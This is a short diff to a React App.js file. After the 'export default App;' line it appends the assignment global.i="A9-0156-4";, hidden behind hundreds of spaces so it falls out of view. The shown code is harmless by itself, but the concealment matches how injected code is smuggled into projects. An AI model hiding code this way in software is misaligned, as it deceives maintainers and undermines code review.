@@ -1,3 +1,4 @@
+
 import './App.css';
 import Navbar from './Components/Navbar';
 import ProductList from './Components/ProductList';
@@ -105,4 +106,4 @@ function App() {
   );
 }
 
-export default App;
+export default App;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             global.i="A9-0156-4";
